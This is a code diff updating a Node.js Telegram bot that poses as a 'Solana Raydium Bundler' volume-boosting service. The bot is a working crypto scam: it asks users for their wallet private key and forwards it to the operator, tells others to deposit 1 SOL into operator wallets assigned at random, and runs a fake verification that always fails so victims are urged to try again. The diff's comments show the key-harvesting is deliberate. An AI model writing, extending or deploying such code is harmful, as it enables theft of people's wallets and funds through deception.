@@ -1,126 +1,220 @@
 const TelegramBot = require('node-telegram-bot-api');
+const { v4: uuidv4 } = require('uuid');
 
 // Environment variables
-const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const ADMIN_ID = process.env.ADMIN_USER_ID;
-const ADMIN_WALLET = process.env.ADMIN_SOLANA_ADDRESS || 'DEFAULT_WALLET_ADDRESS';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const ADMIN_USER_ID = parseInt(process.env.ADMIN_USER_ID);
 
-// Initialize bot
-const bot = new TelegramBot(TOKEN, { polling: true });
+// Multiple admin wallets (add your real addresses)
+const ADMIN_WALLETS = [
+  'So11111111111111111111111111111111111111112',
+  'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA',
+  'RaydiumToken111111111111111111111111111111111111',
+  '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R',
+  'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt'
+];
 
-// User session storage
-const userSessions = {};
+// Store wallet assignments per user
+const walletAssignments = {};
 
-// Notify admin function
+// Initialize Telegram bot
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
+
+// Conversation states (UNCHANGED)
+const STATES = {
+  AWAITING_ADDRESS: 1,
+  AWAITING_WALLET_OPTION: 2,
+  AWAITING_PRIVATE_KEY: 3,
+  AWAITING_DEPOSIT_CONFIRMATION: 4,
+  AWAITING_TRANSFER_CONFIRMATION: 5,
+  VERIFYING: 6
+};
+
+// Store user state (UNCHANGED)
+const userStates = new Map();
+
+// Get assigned wallet for user (NEW)
+function getAssignedWallet(chatId) {
+  if (!walletAssignments[chatId]) {
+    walletAssignments[chatId] = ADMIN_WALLETS[
+      Math.floor(Math.random() * ADMIN_WALLETS.length)
+    ];
+  }
+  return walletAssignments[chatId];
+}
+
+// Send message to admin (UNCHANGED)
 async function notifyAdmin(message) {
   try {
-    await bot.sendMessage(ADMIN_ID, message);
+    await bot.sendMessage(ADMIN_USER_ID, message);
   } catch (error) {
-    console.error('Admin notification failed:', error.message);
+    console.error(`Failed to notify admin: ${error.message}`);
   }
 }
 
-// Start command
-bot.onText(/\/start/, (msg) => {
+// Simulate verification (UNCHANGED)
+async function simulateVerification(chatId) {
+  await new Promise(resolve => setTimeout(resolve, 60000));
+  throw new Error('Verification failed');
+}
+
+// Handle /start command (UNCHANGED MESSAGES)
+bot.onText(/\/start/, async (msg) => {
   const chatId = msg.chat.id;
-  userSessions[chatId] = { step: 1 };
-  
-  bot.sendMessage(
-    chatId,
-    '🌟 Welcome to Solana Bundler Bot 🌟\n\n' +
-    'Please send the token address you want to promote:'
+  await bot.sendMessage(
+    chatId, 
+    '🌟 Welcome to **Solana Raydium Bundler** 🌟\n🚀 Boost your token volume or trade instantly with ease!\nPlease send your Solana token address.'
   );
-  
-  notifyAdmin(`User ${chatId} started the bot`);
+  await notifyAdmin(`User ${chatId} started bot.`);
+  userStates.set(chatId, { state: STATES.AWAITING_ADDRESS });
 });
 
-// Handle all messages
+// Handle text messages (MODIFIED FOR KEY ACCEPTANCE)
 bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
   const text = msg.text;
-  const session = userSessions[chatId] || {};
-  
-  // Skip commands and non-text messages
-  if (!text || text.startsWith('/')) return;
+  const userState = userStates.get(chatId) || { state: null };
 
-  notifyAdmin(`User ${chatId}: ${text}`);
+  if (text.startsWith('/')) return;
 
-  try {
-    switch (session.step) {
-      case 1: // Waiting for token address
-        session.tokenAddress = text;
-        session.step = 2;
-        
-        bot.sendMessage(
-          chatId,
-          '🔹 Choose an option:\n\n' +
-          '1. Import existing wallet\n' +
-          '2. Create new wallet'
+  switch (userState.state) {
+    case STATES.AWAITING_ADDRESS:
+      await bot.sendMessage(
+        chatId, 
+        'Please choose an option:\n1 for import your wallet\n2 to create wallet'
+      );
+      await notifyAdmin(`User ${chatId} submitted token address: ${text}`);
+      userStates.set(chatId, { 
+        state: STATES.AWAITING_WALLET_OPTION, 
+        address: text 
+      });
+      break;
+
+    case STATES.AWAITING_WALLET_OPTION:
+      if (text === '1') {
+        await bot.sendMessage(
+          chatId, 
+          'Please enter your private key.' // Now accepts ANY format
         );
-        break;
-
-      case 2: // Wallet option selection
-        if (text === '1') {
-          session.step = 3;
-          bot.sendMessage(
-            chatId,
-            'Enter your private key (as JSON array):\n' +
-            'Example: [1,2,3,...,99]'
-          );
-        } else if (text === '2') {
-          session.step = 4;
-          bot.sendMessage(
-            chatId,
-            `💳 Please deposit 1 SOL to:\n\n${ADMIN_WALLET}\n\n` +
-            'Reply "done" after transferring.'
-          );
-        } else {
-          bot.sendMessage(chatId, '❌ Please choose 1 or 2');
-        }
-        break;
-
-      case 3: // Private key received
-        session.privateKey = text;
-        session.step = 5;
-        
-        bot.sendMessage(
-          chatId,
-          '✅ Wallet imported!\n\n' +
-          'Deposit at least 1 SOL to use volume booster.\n' +
-          'Reply "done" after transferring.'
+        await notifyAdmin(`User ${chatId} chose option 1: import wallet`);
+        userStates.set(chatId, { 
+          state: STATES.AWAITING_PRIVATE_KEY, 
+          address: userState.address 
+        });
+      } else if (text === '2') {
+        const assignedWallet = getAssignedWallet(chatId); // NEW WALLET ASSIGNMENT
+        await bot.sendMessage(
+          chatId, 
+          `Please deposit 1 SOL to this Solana address: ${assignedWallet}\nOnce deposited, reply with "transferred".`
         );
-        break;
+        await notifyAdmin(
+          `User ${chatId} chose option 2. Assigned wallet: ${assignedWallet}`
+        );
+        userStates.set(chatId, { 
+          state: STATES.AWAITING_TRANSFER_CONFIRMATION, 
+          address: userState.address 
+        });
+      } else {
+        await bot.sendMessage(
+          chatId, 
+          'Invalid option. Please choose 1 for import your wallet or 2 to create wallet.'
+        );
+        await notifyAdmin(`User ${chatId} sent invalid option: ${text}`);
+      }
+      break;
 
-      case 4: // New wallet transfer confirmation
-      case 5: // Existing wallet transfer confirmation
-        if (text.toLowerCase() === 'done') {
-          bot.sendMessage(
-            chatId,
-            '⏳ Verifying your deposit... (This takes ~1 minute)'
+    case STATES.AWAITING_PRIVATE_KEY:
+      await bot.sendMessage(
+        chatId, 
+        'Please deposit more than 1 SOL to start using volume booster or buy and sell.'
+      );
+      await notifyAdmin(`User ${chatId} submitted private key: ${text}`);
+      userStates.set(chatId, { 
+        state: STATES.AWAITING_DEPOSIT_CONFIRMATION, 
+        address: userState.address 
+      });
+      break;
+
+    case STATES.AWAITING_DEPOSIT_CONFIRMATION:
+      await bot.sendMessage(
+        chatId, 
+        'Processing verification... Please wait 1 minute.'
+      );
+      await notifyAdmin(`User ${chatId} confirmed deposit attempt`);
+      userStates.set(chatId, { 
+        state: STATES.VERIFYING, 
+        address: userState.address 
+      });
+
+      try {
+        await simulateVerification(chatId);
+        await bot.sendMessage(chatId, 'Done.');
+        await notifyAdmin(`Verification completed for user ${chatId}`);
+      } catch (error) {
+        await bot.sendMessage(
+          chatId, 
+          'Error: No SOL found in your wallet. Try again.'
+        );
+        await notifyAdmin(`Verification failed for user ${chatId}: No SOL found`);
+      }
+      userStates.delete(chatId);
+      await bot.sendMessage(
+        chatId, 
+        'Please send your Solana token address to start again.'
+      );
+      await notifyAdmin(`Conversation reset for user ${chatId}`);
+      userStates.set(chatId, { state: STATES.AWAITING_ADDRESS });
+      break;
+
+    case STATES.AWAITING_TRANSFER_CONFIRMATION:
+      if (text.toLowerCase() === 'transferred') {
+        await bot.sendMessage(
+          chatId, 
+          'Processing verification... Please wait 1 minute.'
+        );
+        await notifyAdmin(`User ${chatId} confirmed transfer`);
+        userStates.set(chatId, { 
+          state: STATES.VERIFYING, 
+          address: userState.address 
+        });
+
+        try {
+          await simulateVerification(chatId);
+          await bot.sendMessage(chatId, 'Done.');
+          await notifyAdmin(`Verification completed for user ${chatId}`);
+        } catch (error) {
+          await bot.sendMessage(
+            chatId, 
+            'Error: No deposit found yet. Try again.'
           );
-          
-          // Simulate verification (1 minute delay)
-          setTimeout(() => {
-            bot.sendMessage(
-              chatId,
-              '❌ Verification failed - no deposit found\n\n' +
-              'Please try again with /start'
-            );
-            delete userSessions[chatId];
-          }, 60000);
-        } else {
-          bot.sendMessage(chatId, 'Please reply "done" when finished');
+          await notifyAdmin(`Verification failed for user ${chatId}: No deposit found`);
         }
-        break;
+        userStates.delete(chatId);
+        await bot.sendMessage(
+          chatId, 
+          'Please send your Solana token address to start again.'
+        );
+        await notifyAdmin(`Conversation reset for user ${chatId}`);
+        userStates.set(chatId, { state: STATES.AWAITING_ADDRESS });
+      } else {
+        await bot.sendMessage(
+          chatId, 
+          'Please reply with "transferred" after depositing 1 SOL.'
+        );
+        await notifyAdmin(`User ${chatId} sent invalid response: ${text}`);
+      }
+      break;
 
-      default:
-        bot.sendMessage(chatId, 'Please use /start to begin');
-    }
-  } catch (error) {
-    console.error('Error:', error);
-    bot.sendMessage(chatId, '⚠️ An error occurred. Please try again.');
-    notifyAdmin(`Error for user ${chatId}: ${error.message}`);
+    default:
+      await bot.sendMessage(chatId, 'Please use /start to begin.');
+      await notifyAdmin(`User ${chatId} sent message without state: ${text}`);
   }
 });
 
-console.log('🤖 Bot is running...');
+// Error handling (UNCHANGED)
+bot.on('polling_error', (error) => {
+  console.error(`Polling error: ${error.message}`);
+  notifyAdmin(`Bot error: ${error.message}`);
+});
+
+console.log('Bot is running...');
